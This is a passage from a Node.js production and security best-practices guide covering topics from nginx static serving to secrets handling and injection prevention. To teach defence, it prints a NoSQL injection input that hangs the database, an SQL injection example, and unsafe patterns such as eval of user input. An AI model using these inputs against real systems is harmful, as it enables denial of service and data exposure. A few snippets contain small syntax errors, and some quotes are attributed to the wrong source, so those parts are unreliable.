> …It’s very easy to fall into this trap – You see a package like Express and think “Awesome! Let’s get started” – you code away and you’ve got an application that does what you want. This is excellent and, to be honest, you’ve won a lot of the battle. However, you will lose the war if you upload your app to a server and have it listen on your HTTP port because you’ve forgotten a very crucial thing: Node is not a web server. **As soon as any volume of traffic starts to hit your application, you’ll notice that things start to go wrong: connections are dropped, assets stop being served or, at the very worst, your server crashes. What you’re doing is attempting to have Node deal with all of the complicated things that a proven web server does really well. Why reinvent the wheel?**
> **This is just for one request, for one image and bearing in mind this is the memory that your application could be used for important stuff like reading a database or handling complicated logic; why would you cripple your application for the sake of convenience?**

* From the blog [Argteam](http://blog.argteam.com/coding/hardening-node-js-for-production-part-2-using-nginx-to-avoid-node-js-load):
> Although express.js has built-in static file handling through some connect middleware, you should never use it. **Nginx can do a much better job of handling static files and can prevent requests for non-dynamic content from clogging our node processes**…

<br/><br/>

# `Lock Dependencies`

<br/><br/>

### One Paragraph Explainer

Your code depends on many external packages, let’s say it ‘requires’ and use momentjs-2.1.4, then by default when you deploy to production npm might fetch momentjs 2.1.5 which unfortunately brings some new bugs to the table. Using npm config files and the argument ```–save-exact=true``` instructs npm to refer to the *exact* same version that was installed so the next time you run ```npm install``` (in production or within a Docker container you plan to ship forward for testing) the same dependent version will be fetched. An alternative and popular approach is using a `.shrinkwrap` file (easily generated using npm) that states exactly which packages and versions should be installed so no environment can get tempted to fetch newer versions than expected.

* **Update:** as of npm 5, dependencies are locked automatically using .shrinkwrap. Yarn, an emerging package manager, also locks down dependencies by default.

<br/><br/>

### Code example: .npmrc file that instructs npm to use exact versions

```npmrc
// save this as .npmrc file on the project directory
save-exact:true
```

<br/><br/>

### Code example: shrinkwrap.json file that distills the exact dependency tree

```json
{
    "name": "A",
    "dependencies": {
        "B": {
            "version": "0.0.1",
            "dependencies": {
                "C": {
                    "version": "0.1.0"
                }
            }
        }
    }
}
```

<br/><br/>

### Code example: npm 5 dependencies lock file – package.json

```json
{
    "name": "package-name",
    "version": "1.0.0",
    "lockfileVersion": 1,
    "dependencies": {
        "cacache": {
            "version": "9.2.6",
            "resolved": "https://registry.npmjs.org/cacache/-/cacache-9.2.6.tgz",
            "integrity": "sha512-YK0Z5Np5t755edPL6gfdCeGxtU0rcW/DBhYhYVDckT+7AFkCCtedf2zru5NRbBLFk6e7Agi/RaqTOAfiaipUfg=="
        },
        "duplexify": {
            "version": "3.5.0",
            "resolved": "https://registry.npmjs.org/duplexify/-/duplexify-3.5.0.tgz",
            "integrity": "sha1-GqdzAC4VeEV+nZ1KULDMquvL1gQ=",
            "dependencies": {
                "end-of-stream": {
                    "version": "1.0.0",
                    "resolved": "https://registry.npmjs.org/end-of-stream/-/end-of-stream-1.0.0.tgz",
                    "integrity": "sha1-1FlucCc0qT5A6a+GQxnqvZn/Lw4="
                }
            }
        }
    }
}
```

<br/><br/>

# `Guard and restart your process upon failure (using the right tool)`

<br/><br/>

### One Paragraph Explainer

At the base level, Node processes must be guarded and restarted upon failures. Simply put, for small apps and those who don’t use containers – tools like [PM2](https://www.npmjs.com/package/pm2-docker) are perfect as they bring simplicity, restarting capabilities and also rich integration with Node. Others with strong Linux skills might use systemd and run Node as a service. Things get more interesting for apps that use Docker or any container technology since those are usually accompanied by cluster management and orchestration tools (e.g. [AWS ECS](http://docs.aws.amazon.com/AmazonECS/latest/developerguide/Welcome.html), [Kubernetes](https://kubernetes.io/), etc) that deploy, monitor and heal containers. Having all those rich cluster management features including container restart, why mess up with other tools like PM2? There’s no bulletproof answer. There are good reasons to keep PM2 within containers (mostly its containers specific version [pm2-docker](https://www.npmjs.com/package/pm2-docker)) as the first guarding tier – it’s much faster to restart a process and provide Node-specific features like flagging to the code when the hosting container asks to gracefully restart. Other might choose to avoid unnecessary layers. To conclude this write-up, no solution suits them all and getting to know the options is the important thing

<br/><br/>

### What Other Bloggers Say

* From the [Express Production Best Practices](https://expressjs.com/en/advanced/best-practice-performance.html):
> ... In development, you started your app simply from the command line with node server.js or something similar. **But doing this in production is a recipe for disaster. If the app crashes, it will be offline** until you restart it. To ensure your app restarts if it crashes, use a process manager. A process manager is a “container” for applications that facilitate deployment, provides high availability, and enables you to manage the application at runtime.

* From the Medium blog post [Understanding Node Clustering](https://medium.com/@CodeAndBiscuits/understanding-nodejs-clustering-in-docker-land-64ce2306afef#.cssigr5z3):
> ... Understanding Node.js Clustering in Docker-Land “Docker containers are streamlined, lightweight virtual environments, designed to simplify processes to their bare minimum. Processes that manage and coordinate their own resources are no longer as valuable. **Instead, management stacks like Kubernetes, Mesos, and Cattle have popularized the concept that these resources should be managed infrastructure-wide**. CPU and memory resources are allocated by “schedulers”, and network resources are managed by stack-provided load balancers.


<br/><br/>

# `Utilize all CPU cores`

<br/><br/>

### One Paragraph Explainer

It might not come as a surprise that in its basic form, Node runs over a single thread=single process=single CPU. Paying for beefy hardware with 4 or 8 CPU and utilizing only one sounds crazy, right? The quickest solution which fits medium sized apps is using Node’s Cluster module which in 10 lines of code spawns a process for each logical core and route requests between the processes in a round-robin style. Even better, use PM2 which sugarcoats the clustering module with a simple interface and cool monitoring UI. While this solution works well for traditional applications, it might fall short for applications that require top-notch performance and robust DevOps flow. For those advanced use cases, consider replicating the NODE process using custom deployment script and balancing using a specialized tool such as nginx or use a container engine such as AWS ECS or Kubernetees that have advanced features for deployment and replication of processes.

<br/><br/>

### Comparison: Balancing using Node’s cluster vs nginx
[utilizecpu1]: assets/images/utilizecpucores1.png

![utilizecpu1]
<br/><br/>

### What Other Bloggers Say

* From the [Node.js documentation](https://nodejs.org/api/cluster.html#cluster_how_it_works):
> ... The second approach, Node clusters, should, in theory, give the best performance. In practice, however, distribution tends to be very unbalanced due to operating system scheduler vagaries. Loads have been observed where over 70% of all connections ended up in just two processes, out of a total of eight ...

* From the blog [StrongLoop](https://strongloop.com/strongblog/best-practices-for-express-in-production-part-two-performance-and-reliability/):
> ... Clustering is made possible with Node’s cluster module. This enables a master process to spawn worker processes and distribute incoming connections among the workers. However, rather than using this module directly, it’s far better to use one of the many tools out there that do it for you automatically; for example node-pm or cluster-service ...

* From the Medium post [Node.js process load balance performance: comparing cluster module, iptables, and Nginx](https://medium.com/@fermads/node-js-process-load-balancing-comparing-cluster-iptables-and-nginx-6746aaf38272)
> ... Node cluster is simple to implement and configure, things are kept inside Node’s realm without depending on other software. Just remember your master process will work almost as much as your worker processes and with a little less request rate than the other solutions ...

<br/><br/>

# `Create Maintenance Endpoint`

<br/><br/>

### One Paragraph Explainer

A maintenance endpoint is a highly secure HTTP API that is part of the app code and its purpose is to be used by the ops/production team to monitor and expose maintenance functionality. For example, it can return a heap dump (memory snapshot) of the process, report whether there are some memory leaks and even allow to execute REPL commands directly. This endpoint is needed where the conventional DevOps tools (monitoring products, logs, etc) fail to gather some specific type of information or you choose not to buy/install such tools. The golden rule is using professional and external tools for monitoring and maintaining the production, these are usually more robust and accurate. That said, there are likely to be cases where the generic tools will fail to extract information that is specific to Node or to your app – for example, should you wish to generate a memory snapshot at the moment GC completed a cycle – few npm libraries will be glad to perform this for you but popular monitoring tools will likely miss this functionality. It is important to keep this endpoint private and accessibly only by admins because it can become a target of a DDOS attack.

<br/><br/>

### Code example: generating a heap dump via code

```javascript
const heapdump = require('heapdump');

// Check if request is authorized 
function isAuthorized(req) {
    // ...
}

router.get('/ops/heapdump', (req, res, next) => {
    if (!isAuthorized(req)) {
        return res.status(403).send('You are not authorized!');
    }

    logger.info('About to generate heapdump');

    heapdump.writeSnapshot((err, filename) => {
        console.log('heapdump file is ready to be sent to the caller', filename);
        fs.readFile(filename, "utf-8", (err, data) => {
            res.end(data);
        });
    });
});
```

<br/><br/>

### Recommended Resources

[Getting your Node.js app production ready (Slides)](http://naugtur.pl/pres3/node2prod)

▶ [Getting your Node.js app production ready (Video)](https://www.youtube.com/watch?v=lUsNne-_VIk)

[createmaintenanceendpoint1]: assets/images/createmaintenanceendpoint1.png

![createmaintenanceendpoint1]

<br/><br/>


# `Sure user experience with APM products`

<br/><br/>

### One Paragraph Explainer

APM (application performance monitoring) refers to a family of products that aims to monitor application performance from end to end, also from the customer perspective. While traditional monitoring solutions focus on Exceptions and standalone technical metrics (e.g. error tracking, slow server endpoints, etc), in the real world our app might create disappointed users without any code exceptions, for example, if some middleware service performed real slow. APM products measure the user experience from end to end, for example, given a system that encompasses frontend UI and multiple distributed services – some APM products can tell how fast a transaction that spans multiple tiers last. It can tell whether the user experience is solid and point to the problem. This attractive offering comes with a relatively high price tag hence it’s recommended for large-scale and complex products that require going beyond straightforward monitoring.

<br/><br/>

### APM example – a commercial product that visualizes cross-service app performance
[apm1]: assets/images/apm1.png
![apm1]

<br/><br/>

### APM example – a commercial product that emphasizes the user experience score

[apm2]: assets/images/apm2.png
![apm2]

<br/><br/>

### APM example – a commercial product that highlights slow code paths

[apm3]: assets/images/apm3.png
![apm3]

<br/><br/>

# `Make your code production-ready`

<br/><br/>

### One Paragraph Explainer

Following is a list of development tips that greatly affect the production maintenance and stability:

* The twelve-factor guide – Get familiar with the [Twelve factors](https://12factor.net/) guide
* Be stateless – Save no data locally on a specific web server (see separate bullet – ‘Be Stateless’)
* Cache – Utilize cache heavily, yet never fail because of cache mismatch
* Test memory – gauge memory usage and leaks as part your development flow, tools such as ‘memwatch’ can greatly facilitate this task
* Name functions – Minimize the usage of anonymous functions (i.e. inline callback) as a typical memory profiler will provide memory usage per method name
* Use CI tools – Use CI tool to detect failures before sending to production. For example, use ESLint to detect reference errors and undefined variables. Use –trace-sync-io to identify code that uses synchronous APIs (instead of the async version)
* Log wisely – Include in each log statement contextual information, hopefully in JSON format so log aggregators tools such as Elastic can search upon those properties (see separate bullet – ‘Increase visibility using smart logs’). Also, include transaction-id that identifies each request and allows to correlate lines that describe the same transaction (see separate bullet – ‘Include Transaction-ID’)
* Error management – Error handling is the Achilles’ heel of Node.js production sites – many Node processes are crashing because of minor errors while others hang on alive in a faulty state instead of crashing. Setting your error handling strategy is absolutely critical, read here my [error handling best practices](http://goldbergyoni.com/checklist-best-practices-of-node-js-error-handling/)

<br/><br/>

# `Measure and guard the memory usage`

<br/><br/>

### One Paragraph Explainer

In a perfect world, a web developer shouldn’t deal with memory leaks. In reality, memory issues are a known Node’s gotcha one must be aware of. Above all, memory usage must be monitored constantly. In the development and small production sites, you may gauge manually using Linux commands or npm tools and libraries like node-inspector and memwatch. The main drawback of this manual activities is that they require a human being actively monitoring – for serious production sites, it’s absolutely vital to use robust monitoring tools e.g. (AWS CloudWatch, DataDog or any similar proactive system) that alerts when a leak happens. There are also few development guidelines to prevent leaks: avoid storing data on the global level, use streams for data with dynamic size, limit variables scope using let and const.

<br/><br/>

### What Other Bloggers Say

* From the blog [Dyntrace](http://apmblog.dynatrace.com/):
> ... ”As we already learned, in Node.js JavaScript is compiled to native code by V8. The resulting native data structures don’t have much to do with their original representation and are solely managed by V8. This means that we cannot actively allocate or deallocate memory in JavaScript. V8 uses a well-known mechanism called garbage collection to address this problem.”

* From the blog [Dyntrace](http://blog.argteam.com/coding/hardening-node-js-for-production-part-2-using-nginx-to-avoid-node-js-load):
> ... “Although this example leads to obvious results the process is always the same:
Create heap dumps with some time and a fair amount of memory allocation in between
Compare a few dumps to find out what’s growing”

* From the blog [Dyntrace](http://blog.argteam.com/coding/hardening-node-js-for-production-part-2-using-nginx-to-avoid-node-js-load):
> ... “fault, Node.js will try to use about 1.5GBs of memory, which has to be capped when running on systems with less memory. This is the expected behavior as garbage collection is a very costly operation.
The solution for it was adding an extra parameter to the Node.js process:
node –max_old_space_size=400 server.js –production ”
“Why is garbage collection expensive? The V8 JavaScript engine employs a stop-the-world garbage collector mechanism. In practice, it means that the program stops execution while garbage collection is in progress.”

<br/><br/>


# `Get your frontend assets out of Node`

<br/><br/>

### One Paragraph Explainer

In a classic web app the backend serves the frontend/graphics to the browser, a very common approach in the Node’s world is to use Express static middleware for streamlining static files to the client. BUT – Node is not a typical webapp as it utilizes a single thread that is not optimized to serve many files at once. Instead, consider using a reverse proxy (e.g. nginx, HAProxy), cloud storage or CDN (e.g. AWS S3, Azure Blob Storage, etc) that utilizes many optimizations for this task and gain much better throughput. For example, specialized middleware like nginx embodies direct hooks between the file system and the network card and uses a multi-threaded approach to minimize intervention among multiple requests.

Your optimal solution might wear one of the following forms:

1. Using a reverse proxy – your static files will be located right next to your Node application, only requests to the static files folder will be served by a proxy that sits in front of your Node app such as nginx. Using this approach, your Node app is responsible deploying the static files but not to serve them. Your frontend’s colleague will love this approach as it prevents cross-origin-requests from the frontend.

2. Cloud storage – your static files will NOT be part of your Node app content, they will be uploaded to services like AWS S3, Azure BlobStorage, or other similar services that were born for this mission. Using this approach, your Node app is not responsible deploying the static files neither to serve them, hence a complete decoupling is drawn between Node and the Frontend which is anyway handled by different teams.

<br/><br/>

### Configuration example: typical nginx configuration for serving static files

```nginx
# configure gzip compression
gzip on;
keepalive 64;

# defining web server
server {
listen 80;
listen 443 ssl;

# handle static content
location ~ ^/(images/|img/|javascript/|js/|css/|stylesheets/|flash/|media/|static/|robots.txt|humans.txt|favicon.ico) {
root /usr/local/silly_face_society/node/public;
access_log off;
expires max;
}
```

<br/><br/>

### What Other Bloggers Say

From the blog [StrongLoop](https://strongloop.com/strongblog/best-practices-for-express-in-production-part-two-performance-and-reliability/):

>…In development, you can use [res.sendFile()](http://expressjs.com/4x/api.html#res.sendFile) to serve static files. But don’t do this in production, because this function has to read from the file system for every file request, so it will encounter significant latency and affect the overall performance of the app. Note that res.sendFile() is not implemented with the sendfile system call, which would make it far more efficient. Instead, use serve-static middleware (or something equivalent), that is optimized for serving files for Express apps. An even better option is to use a reverse proxy to serve static files; see Use a reverse proxy for more information…

<br/><br/>

# `Be stateless, kill your Servers almost every day`

<br/><br/>

### One Paragraph Explainer

Have you ever encountered a severe production issue where one server was missing some piece of configuration or data? That is probably due to some unnecessary dependency on some local asset that is not part of the deployment. Many successful products treat servers like a phoenix bird – it dies and is reborn periodically without any damage. In other words, a server is just a piece of hardware that executes your code for some time and is replaced after that.
This approach

- allows scaling by adding and removing servers dynamically without any side-effects.
- simplifies the maintenance as it frees our mind from evaluating each server state.

<br/><br/>

### Code example: anti-patterns

```javascript
// Typical mistake 1: saving uploaded files locally on a server
var multer = require('multer'); // express middleware for handling multipart uploads
var upload = multer({ dest: 'uploads/' });

app.post('/photos/upload', upload.array('photos', 12), function (req, res, next) {});

// Typical mistake 2: storing authentication sessions (passport) in a local file or memory
var FileStore = require('session-file-store')(session);
app.use(session({
    store: new FileStore(options),
    secret: 'keyboard cat'
}));

// Typical mistake 3: storing information on the global object
Global.someCacheLike.result = { somedata };
```

<br/><br/>

### What Other Bloggers Say

From the blog [Martin Fowler](https://martinfowler.com/bliki/PhoenixServer.html):
> ...One day I had this fantasy of starting a certification service for operations. The certification assessment would consist of a colleague and I turning up at the corporate data center and setting about critical production servers with a baseball bat, a chainsaw, and a water pistol. The assessment would be based on how long it would take for the operations team to get all the applications up and running again. This may be a daft fantasy, but there’s a nugget of wisdom here. While you should forego the baseball bats, it is a good idea to virtually burn down your servers at regular intervals. A server should be like a phoenix, regularly rising from the ashes...

<br/><br/>

# `Use tools that automatically detect vulnerable dependencies`

<br/><br/>

### One Paragraph Explainer

Modern Node applications have tens and sometimes hundreds of dependencies. If any of the dependencies
you use has a known security vulnerability your app is vulnerable as well.
The following tools automatically check for known security vulnerabilities in your dependencies:

- [npm audit](https://docs.npmjs.com/cli/audit) - npm audit
- [snyk](https://snyk.io/) - Continuously find & fix vulnerabilities in your dependencies

<br/><br/>

### What Other Bloggers Say

From the [StrongLoop](https://strongloop.com/strongblog/best-practices-for-express-in-production-part-one-security/) blog:

> ...Using to manage your application’s dependencies is powerful and convenient. But the packages that you use may contain critical security vulnerabilities that could also affect your application. The security of your app is only as strong as the “weakest link” in your dependencies. Fortunately, there are two helpful tools you can use to ensure the third-party packages you use: nsp and requireSafe. These two tools do largely the same thing, so using both might be overkill, but “better safe than sorry” are words to live by when it comes to security...

<br/><br/>

# `Assign ‘TransactionId’ to each log statement`

<br/><br/>

### One Paragraph Explainer

A typical log is a warehouse of entries from all components and requests. Upon detection of some suspicious line or error, it becomes hairy to match other lines that belong to the same specific flow (e.g. the user “John” tried to buy something). This becomes even more critical and challenging in a microservice environment when a request/transaction might span across multiple computers. Address this by assigning a unique transaction identifier value to all the entries from the same request so when detecting one line one can copy the id and search for every line that has similar transaction Id. However, achieving this In Node is not straightforward as a single thread is used to serve all requests –consider using a library that that can group data on the request level – see code example on the next slide. When calling other microservice, pass the transaction Id using an HTTP header like “x-transaction-id” to keep the same context.

<br/><br/>

### Code example: typical Express configuration

```javascript
// when receiving a new request, start a new isolated context and set a transaction Id. The following example is using the npm library continuation-local-storage to isolate requests

const { createNamespace } = require('continuation-local-storage');
var session = createNamespace('my session');

router.get('/:id', (req, res, next) => {
    session.set('transactionId', 'some unique GUID');
    someService.getById(req.params.id);
    logger.info('Starting now to get something by Id');
});

// Now any other service or components can have access to the contextual, per-request, data
class someService {
    getById(id) {
        logger.info(“Starting to get something by Id”);
        // other logic comes here
    }
}

// The logger can now append the transaction-id to each entry so that entries from the same request will have the same value
class logger {
    info (message)
    {console.log(`${message} ${session.get('transactionId')}`);}
}
```

<br/><br/>

# `Set NODE_ENV = production`

<br/><br/>

### One Paragraph Explainer

Process environment variables is a set of key-value pairs made available to any running program, usually for configuration purposes. Though any variables can be used, Node encourages the convention of using a variable called NODE_ENV to flag whether we’re in production right now. This determination allows components to provide better diagnostics during development, for example by disabling caching or emitting verbose log statements. Any modern deployment tool – Chef, Puppet, CloudFormation, others – support setting environment variables during deployment

<br/><br/>

### Code example: Setting and reading the NODE_ENV environment variable

```javascript
// Setting environment variables in bash before starting the node process
$ NODE_ENV=development
$ node

// Reading the environment variable using code
if (process.env.NODE_ENV === “production”)
    useCaching = true;
```

<br/><br/>

### What Other Bloggers Say

From the blog [dynatrace](https://www.dynatrace.com/blog/the-drastic-effects-of-omitting-node_env-in-your-express-js-applications/):
> ...In Node.js there is a convention to use a variable called NODE_ENV to set the current mode. We see that it, in fact, reads NODE_ENV and defaults to ‘development’ if it isn’t set. We clearly see that by setting NODE_ENV to production the number of requests Node.js can handle jumps by around two-thirds while the CPU usage even drops slightly. *Let me emphasize this: Setting NODE_ENV to production makes your application 3 times faster!*

[setnodeenv1]: assets/images/setnodeenv1.png
![setnodeenv1]

<br/><br/>


# `Use an LTS release of Node.js in production`

### One Paragraph Explainer

Ensure you are using an LTS(Long Term Support) version of Node.js in production to receive critical bug fixes, security updates and performance improvements. 

LTS versions of Node.js are supported for at least 18 months and are indicated by even version numbers (e.g. 4, 6, 8). They're best for production since the LTS release line is focussed on stability and security, whereas the 'Current' release line has a shorter lifespan and more frequent updates to the code. Changes to LTS versions are limited to bug fixes for stability, security updates, possible npm updates, documentation updates and certain performance improvements that can be demonstrated to not break existing applications.

<br/><br/>

### Read on

🔗 [Node.js release definitions](https://nodejs.org/en/about/releases/)

🔗 [Node.js release schedule](https://github.com/nodejs/Release)

🔗 [Essential Steps: Long Term Support for Node.js by Rod Vagg](https://medium.com/@nodesource/essential-steps-long-term-support-for-node-js-8ecf7514dbd)
> ...the schedule of incremental releases within each of these will be driven by the availability of bug fixes, security fixes, and other small but important changes. The focus will be on stability, but stability also includes minimizing the number of known bugs and staying on top of security concerns as they arise.

<br/><br/>

# `Your application code should not handle log routing`

<br/><br/>

### One Paragraph Explainer

Application code should not handle log routing, but instead should use a logger utility to write to `stdout/stderr`. “Log routing” means picking up and pushing logs to a some other location than your application or application process, for example, writing the logs to a file, database, etc. The reason for this is mostly two-fold: 1) separation of concerns and 2) [12-Factor best practices for modern applications](https://12factor.net/logs).

We often think of "separation of concerns" in terms of pieces of code between services and between services themselves, but this applies to the more “infrastructural” components as well. Your application code should not handle something that should be handled by infrastructure/the execution environment (most often these days, containers). What happens if you define the log locations in your application, but later you need to change that location? That results in a code change and deployment. When working with container-based/cloud-based platforms, containers can spin up and shut down when scaling to performance demands, so we can't be sure where a logfile will end up. The execution environment (container) should decide where the log files get routed to instead. The application should just log what it needs to to `stdout` / `stderr`, and the execution environment should be configured to pick up the log stream from there and route it to where it needs to go. Also, those on the team who need to specify and/or change the log destinations are often not application developers but are part of DevOps, and they might not have familiarity with the application code. This prevents them from easily making changes. 

<br/><br/>

### Code Example – Anti-pattern: Log routing tightly coupled to application

```javascript
const { createLogger, transports, winston } = require('winston');
const winston-mongodb = require('winston-mongodb');
 
// log to two different files, which the application now must be concerned with
const logger = createLogger({
  transports: [
    new transports.File({ filename: 'combined.log' }),
 
  ],
  exceptionHandlers: [
    new transports.File({ filename: 'exceptions.log' })
  ]
});
 
// log to MongoDB, which the application now must be concerned with
winston.add(winston.transports.MongoDB, options);
```
Doing it this way, the application now handles both application/business logic AND log routing logic!

<br/><br/>

### Code Example – Better log handling + Docker example
In the application:
```javascript
const logger = new winston.Logger({
  level: 'info',
  transports: [
    new (winston.transports.Console)()
  ]
});

logger.log('info', 'Test Log Message with some parameter %s', 'some parameter', { anything: 'This is metadata' });
```
Then, in the docker container `daemon.json`:
```javascript
{
  "log-driver": "splunk", // just using Splunk as an example, it could be another storage type
  "log-opts": {
    "splunk-token": "",
    "splunk-url": "",
    ...
  }
}
```
So this example ends up looking like `log -> stdout -> Docker container -> Splunk`

<br/><br/>

### Blog Quote: "O'Reilly"

From the [O'Reilly blog](https://www.oreilly.com/ideas/a-cloud-native-approach-to-logs),
 > When you have a fixed number of instances on a fixed number of servers, storing logs on disk seems to make sense. However, when your application can dynamically go from 1 running instance to 100, and you have no idea where those instances are running, you need your cloud provider to deal with aggregating those logs on your behalf.

<br/><br/>

### Quote: "12-Factor"

From the [12-Factor best practices for logging](https://12factor.net/logs),
 > A twelve-factor app never concerns itself with routing or storage of its output stream. It should not attempt to write to or manage logfiles. Instead, each running process writes its event stream, unbuffered, to stdout.
 
 > In staging or production deploys, each process’ stream will be captured by the execution environment, collated together with all other streams from the app, and routed to one or more final destinations for viewing and long-term archival. These archival destinations are not visible to or configurable by the app, and instead are completely managed by the execution environment.

<br/><br/>

 ### Example: Architecture overview using Docker and Splunk as an example
[logging-overview]: assets/images/logging-overview.png
![logging-overview]

<br/><br/>

# `Embrace linter security rules`

### One Paragraph Explainer

Security plugins for ESLint and TSLint such as [eslint-plugin-security](https://github.com/nodesecurity/eslint-plugin-security) and [tslint-config-security](https://www.npmjs.com/package/tslint-config-security) offer code security checks based on a number of known vulnerabilities, such as unsafe RegEx, unsafe use of `eval()`, and non-literal filenames being used when accessing the file system within an application. The use of git hooks such as [pre-git](https://github.com/bahmutov/pre-git) allows to further enforce any rules on source control before they get distributed to remotes, one of which can be to check that no secrets were added to source control.

### `eslint-plugin-security` example

Some examples of unsafe practice rules detected by `eslint-plugin-security`:

`detect-pseudoRandomBytes`

```javascript
const insecure = crypto.pseudoRandomBytes(5);
```

`detect-non-literal-fs-filename`

```javascript
const path = req.body.userinput;
fs.readFile(path);
```

`detect-eval-with-expression`

```javascript
const userinput = req.body.userinput;
eval(userinput);
```

`detect-non-literal-regexp`

```javascript
const unsafe = new RegExp('/(x+x+)+y/)');
```

An example of running `eslint-plugin-security` on a Node.js project with the above unsafe code practices:
[eslint-plugin-security]: assets/images/eslint-plugin-security.png
![eslint-plugin-security]

### What other bloggers say

From the blog by [Adam Baldwin](https://www.safaribooksonline.com/blog/2014/03/28/using-eslint-plugins-node-js-app-security/):
> Linting doesn’t have to be just a tool to enforce pedantic rules about whitespace, semicolons or eval statements. ESLint provides a powerful framework for eliminating a wide variety of potentially dangerous patterns in your code (regular expressions, input validation, and so on). I think it provides a powerful new tool that’s worthy of consideration by security-conscious JavaScript developers.

<br/><br/>

#  `Limit concurrent requests using a balancer or a middleware`

### One Paragraph Explainer

Rate limiting should be implemented in your application to protect a Node.js application from being overwhelmed by too many requests at the same time. Rate limiting is a task best performed with a service designed for this task, such as nginx, however it is also possible with [rate-limiter-flexible](https://www.npmjs.com/package/rate-limiter-flexible) package or middleware such as [express-rate-limiter](https://www.npmjs.com/package/express-rate-limit) for Express.js applications.
 
  ### Code example: pure Node.js app with [rate-limiter-flexible](https://www.npmjs.com/package/rate-limiter-flexible)
 
  ```javascript
 const http = require('http');
 const redis = require('redis');
 
 const { RateLimiterRedis } = require('rate-limiter-flexible');
 
 const redisClient = redis.createClient({
   enable_offline_queue: false,
 });
 
 // Maximum 20 requests per second
 const rateLimiter = new RateLimiterRedis({
   storeClient: redisClient,
   points: 20,
   duration: 1,
   blockDuration: 2, // block for 2 seconds if consumed more than 20 points per second
 });
 
 http.createServer((req, res) => {
   rateLimiter.consume(req.socket.remoteAddress)
     .then((rateLimiterRes) => {
        // Some app logic here
 
        res.writeHead(200);
        res.end();
      })
      .catch(() => {
        res.writeHead(429);
        res.end('Too Many Requests');
      });
   }
 }).listen(3000);
 ```

You can find [more examples in the documentation](https://github.com/animir/node-rate-limiter-flexible/wiki/Overall-example).

### Code example: Express rate limiting middleware for certain routes

Using [express-rate-limiter](https://www.npmjs.com/package/express-rate-limit) npm package

``` javascript
var RateLimit = require('express-rate-limit');
// important if behind a proxy to ensure client IP is passed to req.ip
app.enable('trust proxy'); 
 
var apiLimiter = new RateLimit({
  windowMs: 15*60*1000, // 15 minutes
  max: 100,
});
 
// only apply to requests that begin with /user/
app.use('/user/', apiLimiter);
```

### What Other Bloggers Say

From the [NGINX blog](https://www.nginx.com/blog/rate-limiting-nginx/):
> Rate limiting can be used for security purposes, for example to slow down brute‑force password‑guessing attacks. It can help protect against DDoS attacks by limiting the incoming request rate to a value typical for real users, and (with logging) identify the targeted URLs. More generally, it is used to protect upstream application servers from being overwhelmed by too many user requests at the same time.

<br/><br/>

# `Extract secrets from config files or use npm package that encrypts them`

### One Paragraph Explainer

The most common and secure way to provide a Node.js application access to keys and secrets is to store them using environment variables on the system where it is being run. Once set, these can be accessed from the global `process.env` object.
A litmus test for whether an app has all config correctly factored out of the code is whether the codebase could be made open source at any moment, without compromising any credentials.

For rare situations where secrets do need to be stored inside source control, using a package such as [cryptr](https://www.npmjs.com/package/cryptr) allows these to be stored in an encrypted form as opposed to in plain text.

There are a variety of tools available which use git commit to audit commits and commit messages for accidental additions of secrets, such as [git-secrets](https://github.com/awslabs/git-secrets).

### Code example

Accessing an API key stored in an environment variable:

```javascript
    const azure = require('azure');

    const apiKey = process.env.AZURE_STORAGE_KEY;
    const blobService = azure.createBlobService(apiKey);
```

Using `cryptr` to store an encrypted secret:

```javascript
const Cryptr = require('cryptr');
const cryptr = new Cryptr(process.env.SECRET);
 
let accessToken = cryptr.decrypt('e74d7c0de21e72aaffc8f2eef2bdb7c1');
 
console.log(accessToken);  // outputs decrypted string which was not stored in source control
```

### What other bloggers say

> Env vars are easy to change between deploys without changing any code; unlike config files, there is little chance of them being checked into the code repo accidentally; and unlike custom config files, or other config mechanisms such as Java System Properties, they are a language- and OS-agnostic standard. [From: The 12 factor app](https://12factor.net/config)

<br/><br/>

# `Preventing database injection vulnerabilities by using ORM/ODM libraries or other DAL packages`

### One Paragraph Explainer

When creating your database logic you should watch out for eventual injection vectors that could be exploited by potential attackers. Writing database queries manually or not including data validation for user requests are the easiest methods to allow for these vulnerabilities. This situation is however easy to avoid when you use suitable packages for validating input and handling database operations. In many cases your system will be safe and sound by using a validation library like
[joi](https://github.com/hapijs/joi) or [yup](https://github.com/jquense/yup) and an ORM/ODM from the list below. This should guarantee the use of parameterized queries and data bindings to ensure the validated data is properly escaped and handled without opening unwanted attack vectors. Many of these libraries will ease your life as a developer by enabling many useful features like not having to write complex queries manually, supplying types for language-based type systems or converting data types to wanted formats. To conclude, __always__ validate any data you are going to store and use proper data-mapping libraries to handle the dangerous work for you.

### Libraries

- [TypeORM](https://github.com/typeorm/typeorm)
- [sequelize](https://github.com/sequelize/sequelize)
- [mongoose](https://github.com/Automattic/mongoose)
- [Knex](https://github.com/tgriesser/knex)
- [Objection.js](https://github.com/Vincit/objection.js)
- [waterline](https://github.com/balderdashy/waterline)

### Example - NoSQL query injection

```javascript
// A query of
db.balances.find( { active: true, $where: function() { return obj.credits - obj.debits < userInput; } } );

// Where userInput equals
"(function(){var date = new Date(); do{curDate = new Date();}while(curDate-date<10000); return Math.max();})()"

// will trigger a denial of service

// Another user input might inject other logic resulting in the database exposing sensitive data
```

### Example - SQL injection

```
SELECT username, firstname, lastname FROM users WHERE id = 'user input';

SELECT username, firstname, lastname FROM users WHERE id = 'evil'input';
```

### Additional resources

🔗 [OWASP SQL Injection](https://www.owasp.org/index.php/SQL_Injection)

🔗 [OWASP SQL Injection Prevention Cheat Sheet](https://github.com/OWASP/CheatSheetSeries)

🔗 [Testing for NoSQL Injection](https://www.owasp.org/index.php/Testing_for_NoSQL_injection)

### What other bloggers say

Risks of NoSQL injection from the [OWASP wiki](https://www.owasp.org/index.php/Testing_for_NoSQL_injection)

> NoSQL injection attacks may execute in different areas of an application than traditional SQL injection. Where SQL injection would execute within the database engine, NoSQL variants may execute during within the application layer or the database layer, depending on the NoSQL API used and data model. Typically NoSQL injection attacks will execute where the attack string is parsed, evaluated, or concatenated into a NoSQL API call.

<br/><br/>

# `Common Node.js security best practices`

The common security guidelines section contains best practices that are standardized in many frameworks and conventions, running an application with SSL/TLS, for example, should be a common guideline and convention followed in every setup to achieve great security benefits.

## Use SSL/TLS to encrypt the client-server connection

**TL;DR:** In the times of [free SSL/TLS certificates](https://letsencrypt.org/) and easy configuration of those, you do no longer have to weigh advantages and disadvantages of using a secure server because the advantages such as security, support of modern technology and trust clearly outweigh the disadvantages like minimal overhead compared to pure HTTP.

**Otherwise:** Attackers could perform man-in-the-middle attacks, spy on your users' behaviour and perform even more malicious actions when the connection is unencrypted

